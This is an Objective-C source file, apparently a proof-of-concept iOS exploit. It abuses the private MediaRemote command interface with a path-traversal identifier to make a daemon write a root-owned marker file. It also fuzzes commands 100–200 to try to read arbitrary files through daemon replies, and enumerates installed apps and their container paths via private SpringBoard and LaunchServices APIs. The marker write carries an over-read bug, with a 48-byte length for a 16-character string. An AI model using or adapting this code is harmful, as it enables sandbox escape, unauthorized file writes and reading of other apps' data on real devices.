//
//  dotdot.m
//  dotdot
//
//  Created by roooot on 03.08.26.
//  Copyright (C) 2026 roooot
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU Affero General Public License as published
//  by the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  You can find the full license text at:
//  https://www.gnu.org/licenses/agpl-3.0.html
//

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

typedef void (^mr_res_t)(NSDictionary *);
typedef void (*mr_send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, mr_res_t);

static mr_send_fn mr_fn(void) {
    static dispatch_once_t once;
    static mr_send_fn fn = NULL;
    dispatch_once(&once, ^{
        dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote", RTLD_NOW);
        fn = (mr_send_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteSendCommand");
    });
    return fn;
}

static NSData *tagged_field(int field, NSData *payload) {
    uint8_t tag = (field << 3) | 2;
    NSMutableData *d = [NSMutableData dataWithBytes:&tag length:1];
    uint64_t len = payload.length;
    while (len >= 0x80) { uint8_t b = (len & 0x7f) | 0x80; [d appendBytes:&b length:1]; len >>= 7; }
    uint8_t b = len; [d appendBytes:&b length:1]; [d appendData:payload];
    return d;
}

// writes successfully but cleanup deletes file after...
int dd_write(const char *identifier, const char *targetPath) {
    mr_send_fn fn = mr_fn();
    if (!fn) return 1;

    NSData *marker = [NSData dataWithBytes:"roooot_was_here\n" length:48];

    NSMutableData *proto = [NSMutableData dataWithData:tagged_field(1, marker)];
    [proto appendData:tagged_field(2, [[NSString stringWithUTF8String:identifier]
                                       dataUsingEncoding:NSUTF8StringEncoding])];

    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto },
       dispatch_get_main_queue(), ^(NSDictionary *r){});

    for (int i = 0; i < 3000000; i++) {
        struct stat st;
        if (stat(targetPath, &st) == 0 && st.st_uid == 0) {
            int fd = open(targetPath, O_RDONLY);
            if (fd >= 0) {
                char buf[256] = {0};
                ssize_t n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0) {
                    printf("(dd) written: uid=%d gid=%d mode=%o size=%lld\n",
                           st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size);
                    printf("(dd) marker: %s", buf);
                    return 0;
                }
            }
        }
    }
    return 1;
}

// Fuzz commands 100-200 concurrently.
// Sends ONLY field 2 (path traversal), no write payload — probing whether
// the daemon reads from that path and echoes contents through the reply.
int dd_fuzz_read(const char *identifier, char *outBuf, size_t bufSize,
                 size_t *outLen, int *foundCmd) {
    mr_send_fn fn = mr_fn();
    if (!fn) return -1;

    NSData *identData = [[NSString stringWithUTF8String:identifier]
                         dataUsingEncoding:NSUTF8StringEncoding];
    NSData *proto = tagged_field(2, identData);

    __block NSData *hit   = nil;
    __block int    hitCmd = -1;
    NSLock        *lock   = [[NSLock alloc] init];

    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);

    for (int cmd = 100; cmd <= 200; cmd++) {
        dispatch_group_enter(group);
        int c = cmd;
        fn(c, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto }, q,
           ^(NSDictionary *r) {
               [lock lock];
               if (!hit) {
                   for (id key in r) {
                       id val = r[key];
                       NSData *bytes = nil;
                       if ([val isKindOfClass:[NSData class]] && ((NSData *)val).length > 4)
                           bytes = (NSData *)val;
                       else if ([val isKindOfClass:[NSString class]] && ((NSString *)val).length > 0)
                           bytes = [(NSString *)val dataUsingEncoding:NSUTF8StringEncoding];
                       if (bytes) {
                           hit    = bytes;
                           hitCmd = c;
                           printf("(dd_read) cmd=%d key=%s len=%zu\n",
                                  c, [[key description] UTF8String], bytes.length);
                           break;
                       }
                   }
               }
               [lock unlock];
               dispatch_group_leave(group);
           });
    }

    dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));

    if (hit && hitCmd >= 0) {
        size_t n = MIN(hit.length, bufSize - 1);
        memcpy(outBuf, hit.bytes, n);
        outBuf[n] = '\0';
        if (outLen)   *outLen   = n;
        if (foundCmd) *foundCmd = hitCmd;
        return 0;
    }
    return -1;
}

// ── Forward declarations ──────────────────────────────────────────────────────
NSArray<NSDictionary<NSString *, NSString *> *> *dd_installed_apps(void);

// ── Container metadata plist key ─────────────────────────────────────────────
#define kMCMMetaId @"MCMMetadataIdentifier"

// ── Read LastLaunchServicesMap.plist → fill id/path/name maps ─────────────────
static NSInteger _load_lsmap(NSMutableOrderedSet *allIds,
                              NSMutableDictionary *dataMap,
                              NSMutableDictionary *bundleMap,
                              NSMutableDictionary *nameMap) {
    NSArray *candidates = @[
        @"/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist",
        @"/private/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist",
    ];
    for (NSString *path in candidates) {
        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:path];
        if (![plist isKindOfClass:[NSDictionary class]]) continue;

        // Keys typically: "User", "System", "Internal", "Disabled"
        NSArray *sections = @[@"User", @"System", @"Internal"];
        for (NSString *section in sections) {
            id sec = plist[section];
            if (![sec isKindOfClass:[NSDictionary class]]) continue;
            NSDictionary *apps = (NSDictionary *)sec;
            for (NSString *bid in apps) {
                if (!bid.length) continue;
                [allIds addObject:bid];
                id info = apps[bid];
                if (![info isKindOfClass:[NSDictionary class]]) continue;
                // "Container" = data container path
                NSString *container = info[@"Container"];
                // "Path" = bundle .app path
                NSString *appPath   = info[@"Path"];
                // some entries also have "BundleContainer"
                NSString *bundleCtn = info[@"BundleContainer"];
                if (container.length  && !dataMap[bid])   dataMap[bid]   = container;
                if (appPath.length    && !bundleMap[bid]) bundleMap[bid] = appPath;
                if (bundleCtn.length  && !bundleMap[bid]) bundleMap[bid] = bundleCtn;
            }
        }
        return (NSInteger)allIds.count;
    }
    return -1; // plist not found
}

// ── Scan a container directory, return {bundleId -> path} ────────────────────
static void _scan_containers(NSString *base,
                             BOOL isBundleContainer,
                             NSMutableDictionary *idToPath,
                             NSMutableDictionary *idToName) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *uuids = [fm contentsOfDirectoryAtPath:base error:nil];
    if (!uuids) return;
    for (NSString *uuid in uuids) {
        NSString *dir  = [base stringByAppendingPathComponent:uuid];
        NSString *meta = [dir stringByAppendingPathComponent:
                          @".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *m = [NSDictionary dictionaryWithContentsOfFile:meta];
        NSString *bid   = m[kMCMMetaId];
        if (!bid || bid.length == 0) continue;

        if (!isBundleContainer) {
            if (!idToPath[bid]) idToPath[bid] = dir;
        } else {
            NSArray *items = [fm contentsOfDirectoryAtPath:dir error:nil];
            for (NSString *item in items) {
                if (![item hasSuffix:@".app"]) continue;
                NSString *appDir   = [dir stringByAppendingPathComponent:item];
                NSString *infoPlist = [appDir stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *info  = [NSDictionary dictionaryWithContentsOfFile:infoPlist];
                if (!idToPath[bid]) idToPath[bid] = appDir;
                if (!idToName[bid]) {
                    NSString *n = info[@"CFBundleDisplayName"] ?: info[@"CFBundleName"];
                    if (n) idToName[bid] = n;
                }
                break;
            }
        }
    }
}

// ── Enrich name/paths from LSApplicationProxy ─────────────────────────────────
static void _enrich_from_lap(NSArray *ids,
                              NSMutableDictionary *idToDataPath,
                              NSMutableDictionary *idToBundlePath,
                              NSMutableDictionary *idToName) {
    Class LAP = NSClassFromString(@"LSApplicationProxy");
    SEL proxyForId = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (!LAP || ![LAP respondsToSelector:proxyForId]) return;

    for (NSString *bid in ids) {
        id proxy = [LAP performSelector:proxyForId withObject:bid];
        if (!proxy) continue;

        if (!idToDataPath[bid]) {
            NSURL *u = [proxy respondsToSelector:@selector(dataContainerURL)]
                       ? [proxy performSelector:@selector(dataContainerURL)] : nil;
            if (u.path) idToDataPath[bid] = u.path;
        }
        if (!idToBundlePath[bid]) {
            NSURL *u = [proxy respondsToSelector:@selector(bundleURL)]
                       ? [proxy performSelector:@selector(bundleURL)] : nil;
            if (u.path) idToBundlePath[bid] = u.path;
        }
        if (!idToName[bid]) {
            NSString *n = [proxy respondsToSelector:@selector(localizedName)]
                          ? [proxy performSelector:@selector(localizedName)] : nil;
            if (n) idToName[bid] = n;
        }
    }
}

// ── Debug info ────────────────────────────────────────────────────────────────
NSString *dd_debug_info(void) {
    NSMutableString *s = [NSMutableString string];
    NSFileManager *fm = [NSFileManager defaultManager];

    // ── Summary first so it's visible at top of dialog ────────────────────────
    {
        NSArray *apps = dd_installed_apps();
        NSUInteger withPath = 0;
        for (NSDictionary *a in apps) { if ([a[@"dataPath"] length] > 0) withPath++; }
        [s appendFormat:@"=== APPS: %lu (paths: %lu) ===\n", (unsigned long)apps.count, (unsigned long)withPath];
        if (apps.count > 0) {
            NSDictionary *f = apps.firstObject;
            [s appendFormat:@"first: %@ | %@\n", f[@"name"], f[@"dataPath"]];
        }
        [s appendString:@"\n"];
    }

    // /var/mobile readability
    NSArray *varMobile = [fm contentsOfDirectoryAtPath:@"/var/mobile" error:nil];
    [s appendFormat:@"/var/mobile: %@\n", varMobile ? [NSString stringWithFormat:@"%lu entries", (unsigned long)varMobile.count] : @"NOT READABLE"];

    // SpringBoardServices — detailed diagnostics
    void *sbsH = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    [s appendFormat:@"SBS handle: %@\n", sbsH ? @"ok" : @"nil (dlopen failed)"];

    if (sbsH) {
        // Form 1: CFArrayRef (*)(BOOL) — classic
        typedef CFArrayRef (*sbs_ids1_t)(BOOL);
        sbs_ids1_t fn1 = (sbs_ids1_t)dlsym(sbsH, "SBSCopyApplicationDisplayIdentifiers");
        [s appendFormat:@"SBSCopyIds fn: %@\n", fn1 ? @"ok" : @"nil (dlsym failed)"];
        if (fn1) {
            CFArrayRef cf = fn1(NO);
            CFIndex cnt = cf ? CFArrayGetCount(cf) : -1;
            [s appendFormat:@"SBSCopyIds(NO) → cf=%@ count=%ld\n", cf ? @"ok" : @"NULL", (long)cnt];
            if (cf) CFRelease(cf);
        }

        // Form 2: void (*)(BOOL, CFArrayRef*) — alternate signature
        typedef void (*sbs_ids2_t)(BOOL, CFArrayRef *);
        sbs_ids2_t fn2 = (sbs_ids2_t)dlsym(sbsH, "SBSCopyApplicationDisplayIdentifiers");
        if (fn2) {
            CFArrayRef cf = NULL;
            fn2(NO, &cf);
            CFIndex cnt = cf ? CFArrayGetCount(cf) : -1;
            [s appendFormat:@"SBSCopyIds2(NO,&cf) → cf=%@ count=%ld\n", cf ? @"ok" : @"NULL", (long)cnt];
            if (cf) CFRelease(cf);
        }

        // SBSCopyLocalizedApplicationNames → CFDictionary bundleId->displayName
        typedef CFDictionaryRef (*sbs_names_t)(void);
        sbs_names_t fnNames = (sbs_names_t)dlsym(sbsH, "SBSCopyLocalizedApplicationNames");
        [s appendFormat:@"SBSCopyLocalizedApplicationNames fn: %@\n", fnNames ? @"ok" : @"nil"];
        if (fnNames) {
            CFDictionaryRef dict = fnNames();
            CFIndex cnt = dict ? CFDictionaryGetCount(dict) : -1;
            [s appendFormat:@"SBSNames count: %ld\n", (long)cnt];
            if (dict) CFRelease(dict);
        }
    }

    // LAP check + real lookup of a known system bundle
    Class LAP = NSClassFromString(@"LSApplicationProxy");
    SEL proxyForId = NSSelectorFromString(@"applicationProxyForIdentifier:");
    BOOL canProxy = LAP && [LAP respondsToSelector:proxyForId];
    [s appendFormat:@"LAP: %@\n", canProxy ? @"ok" : @"no"];
    if (canProxy) {
        // Test with a known system bundle
        for (NSString *testId in @[@"com.apple.mobilesafari", @"com.apple.springboard"]) {
            id proxy = [LAP performSelector:proxyForId withObject:testId];
            if (!proxy) { [s appendFormat:@"LAP[%@]: nil\n", testId]; continue; }
            NSURL *du = [proxy respondsToSelector:@selector(dataContainerURL)]
                        ? [proxy performSelector:@selector(dataContainerURL)] : nil;
            [s appendFormat:@"LAP[%@]: %@\n", testId, du.path ?: @"no dataContainerURL"];
        }
    }

    // LastLaunchServicesMap.plist
    NSArray *lsmapPaths = @[
        @"/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist",
        @"/private/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist",
    ];
    for (NSString *path in lsmapPaths) {
        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:path];
        if (!plist) { [s appendFormat:@"LSMap %@: not readable\n", [path lastPathComponent]]; continue; }
        NSUInteger total = 0;
        for (NSString *section in @[@"User", @"System", @"Internal"]) {
            id sec = plist[section];
            if ([sec isKindOfClass:[NSDictionary class]])
                total += ((NSDictionary *)sec).count;
        }
        [s appendFormat:@"LSMap: %lu apps (keys: %@)\n", (unsigned long)total,
            [[plist allKeys] componentsJoinedByString:@","]];
        break;
    }

    // Container directory scan attempts — multiple paths
    NSArray *dataBases = @[
        @"/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/Application",
        @"/var/mobile/Containers/Data",
    ];
    for (NSString *base in dataBases) {
        NSError *err = nil;
        NSArray *uuids = [fm contentsOfDirectoryAtPath:base error:&err];
        [s appendFormat:@"Data[%@]: %@\n",
            [base lastPathComponent],
            uuids ? [NSString stringWithFormat:@"%lu", (unsigned long)uuids.count]
                  : [NSString stringWithFormat:@"err(%@)", err.localizedDescription]];
    }

    NSArray *bundleBases = @[
        @"/var/containers/Bundle/Application",
        @"/private/var/containers/Bundle/Application",
        @"/var/Containers/Bundle/Application",
    ];
    for (NSString *base in bundleBases) {
        NSError *err = nil;
        NSArray *uuids = [fm contentsOfDirectoryAtPath:base error:&err];
        [s appendFormat:@"Bundle[%@]: %@\n",
            [base lastPathComponent],
            uuids ? [NSString stringWithFormat:@"%lu", (unsigned long)uuids.count]
                  : [NSString stringWithFormat:@"err(%@)", err.localizedDescription]];
    }

    return [s copy];
}

// ── Installed apps ────────────────────────────────────────────────────────────
NSArray<NSDictionary<NSString *, NSString *> *> *dd_installed_apps(void) {
    NSMutableOrderedSet *allIds  = [NSMutableOrderedSet orderedSet];
    NSMutableDictionary *dataMap   = [NSMutableDictionary dictionary];
    NSMutableDictionary *bundleMap = [NSMutableDictionary dictionary];
    NSMutableDictionary *nameMap   = [NSMutableDictionary dictionary];

    // ── Source 0: LastLaunchServicesMap.plist (has IDs + paths in one shot) ───
    _load_lsmap(allIds, dataMap, bundleMap, nameMap);

    // ── Source 1: SBSCopyApplicationDisplayIdentifiers ────────────────────────
    void *sbsH = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);
    if (sbsH) {
        // Form 1: CFArrayRef return
        typedef CFArrayRef (*sbs_ids1_t)(BOOL);
        sbs_ids1_t fn1 = (sbs_ids1_t)dlsym(sbsH, "SBSCopyApplicationDisplayIdentifiers");
        if (fn1) {
            CFArrayRef cf = fn1(NO);
            if (cf) {
                CFTypeID strTypeId = CFStringGetTypeID();
                CFIndex n = CFArrayGetCount(cf);
                for (CFIndex i = 0; i < n; i++) {
                    CFTypeRef val = (CFTypeRef)CFArrayGetValueAtIndex(cf, i);
                    if (!val || CFGetTypeID(val) != strTypeId) continue;
                    NSString *bid = (__bridge NSString *)val;
                    if (bid.length) [allIds addObject:bid];
                }
                CFRelease(cf);
            }
        }

        // Form 2: void (*)(BOOL, CFArrayRef*) — if form 1 returned nothing
        if (fn1 == NULL) {
            typedef void (*sbs_ids2_t)(BOOL, CFArrayRef *);
            sbs_ids2_t fn2 = (sbs_ids2_t)dlsym(sbsH, "SBSCopyApplicationDisplayIdentifiers");
            if (fn2) {
                CFArrayRef cf = NULL;
                fn2(NO, &cf);
                if (cf) {
                    CFIndex n = CFArrayGetCount(cf);
                    for (CFIndex i = 0; i < n; i++) {
                        CFStringRef str = (CFStringRef)CFArrayGetValueAtIndex(cf, i);
                        NSString *bid = (__bridge NSString *)str;
                        if (bid.length) [allIds addObject:bid];
                    }
                    CFRelease(cf);
                }
            }
        }

        // SBSCopyLocalizedApplicationNames → dict { bundleId -> displayName }
        typedef CFDictionaryRef (*sbs_names_t)(void);
        sbs_names_t fnNames = (sbs_names_t)dlsym(sbsH, "SBSCopyLocalizedApplicationNames");
        if (fnNames) {
            CFDictionaryRef dict = fnNames();
            if (dict) {
                NSDictionary *nsDict = (__bridge NSDictionary *)dict;
                for (NSString *bid in nsDict) {
                    if (bid.length) {
                        [allIds addObject:bid];
                        NSString *name = nsDict[bid];
                        if ([name isKindOfClass:[NSString class]] && name.length && !nameMap[bid])
                            nameMap[bid] = name;
                    }
                }
                CFRelease(dict);
            }
        }
    }

    // ── Source 2: Data container filesystem scan ──────────────────────────────
    NSArray *dataBases = @[
        @"/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/Application",
    ];
    for (NSString *base in dataBases) {
        _scan_containers(base, NO, dataMap, nameMap);
        if (dataMap.count > 0) {
            for (NSString *bid in dataMap) [allIds addObject:bid];
            break;
        }
    }

    // ── Source 3: Bundle container filesystem scan ────────────────────────────
    NSArray *bundleBases = @[
        @"/var/containers/Bundle/Application",
        @"/private/var/containers/Bundle/Application",
        @"/var/Containers/Bundle/Application",
    ];
    for (NSString *base in bundleBases) {
        _scan_containers(base, YES, bundleMap, nameMap);
        if (bundleMap.count > 0) {
            for (NSString *bid in bundleMap) [allIds addObject:bid];
            break;
        }
    }

    // ── Source 4: LSApplicationProxy enrichment (fills missing paths/names) ───
    _enrich_from_lap(allIds.array, dataMap, bundleMap, nameMap);

    // ── Source 5: LSApplicationWorkspace selectors (last resort) ─────────────
    if (allIds.count == 0) {
        Class WSClass = NSClassFromString(@"LSApplicationWorkspace");
        id ws = WSClass ? [WSClass performSelector:@selector(defaultWorkspace)] : nil;
        for (NSString *selName in @[@"allInstalledApplications", @"allApplications"]) {
            SEL sel = NSSelectorFromString(selName);
            if (!ws || ![ws respondsToSelector:sel]) continue;
            NSArray *proxies = [ws performSelector:sel];
            for (id proxy in proxies) {
                NSString *bid = [proxy respondsToSelector:@selector(applicationIdentifier)]
                                ? [proxy performSelector:@selector(applicationIdentifier)] : nil;
                if (!bid.length) continue;
                [allIds addObject:bid];
            }
            _enrich_from_lap(allIds.array, dataMap, bundleMap, nameMap);
            if (allIds.count > 0) break;
        }
    }

    // ── Assemble result ───────────────────────────────────────────────────────
    NSMutableArray *result = [NSMutableArray arrayWithCapacity:allIds.count];
    for (NSString *bid in allIds) {
        [result addObject:@{
            @"name":       nameMap[bid]   ?: bid,
            @"bundleId":   bid,
            @"dataPath":   dataMap[bid]   ?: @"",
            @"bundlePath": bundleMap[bid] ?: @""
        }];
    }

    return [result sortedArrayUsingDescriptors:
            @[[NSSortDescriptor sortDescriptorWithKey:@"name" ascending:YES
                                             selector:@selector(localizedCaseInsensitiveCompare:)]]];
}
